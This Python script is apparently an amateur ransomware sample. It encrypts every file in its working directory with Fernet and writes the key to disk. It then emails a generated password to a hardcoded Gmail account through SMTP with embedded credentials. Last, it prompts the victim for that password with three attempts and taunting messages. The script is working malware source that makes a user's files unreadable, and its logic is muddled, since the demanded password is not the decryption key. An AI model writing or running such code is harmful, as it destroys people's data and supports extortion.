import os
from cryptography.fernet import Fernet
import traceback

email_add = 'fakeid2practice@gmail.com'
email_pass = 'fakeidprac'
files = []
count = 0
for file in os.listdir():
    if file == 'encrypt_decrypt.py' or file == 'The_key.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        count += 1
        files.append(file)


def key_generator():
    key = Fernet.generate_key()
    return key


def secret_key_generator():
    skey = Fernet.generate_key()
    # key2 = write_key(key)
    print(skey)
    return skey


def send_mail(email_id, email_password, msg):
    import smtplib
    try:
        server = smtplib.SMTP('smtp.gmail.com', port=587)
        server.starttls()
        server.login(email_id, email_password)
        server.sendmail(email_id, email_id, msg)
        server.quit()
    except Exception as e:
        traceback.print_exc(e)


loop_counter = 0

def decryptor(ki):
    global loop_counter
    user_password = None
    while (user_password != ki):
        user_password = input('Enter the key: \n').encode()
        # user_password = key
        loop_counter += 1
        if loop_counter == 3:
            break
        if (user_password != ki):
            # number = loop_counter - 1
            print("Oops! your fucked...its the wrong password..Files are still decrypted! :(")
            print('You CAN try again but for only few more times... :)')
        else:
            with open('The_key.key', 'rb') as file:
                secretkey = file.read()
            for file in files:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_decrypted)
            print('All your files are now decrypted..Enjoy! :)')
            print(f'No. of encrypted file: {count}')
    if loop_counter == 3:
        print('Your Done For!..Bye')


if __name__ == '__main__':

    pass_key = key_generator()
    print(pass_key)
    with open('The_key.key', 'wb') as file:
        file.write(pass_key)
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(pass_key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_encrypted)

    print('All your files are now Encrypted!')
    print(f'No. of encrypted file: {count}')
    # os.system("python decrypt.py")
    s_key = secret_key_generator()
    send_mail(email_add, email_pass, s_key)
    secret_key = decryptor(s_key)
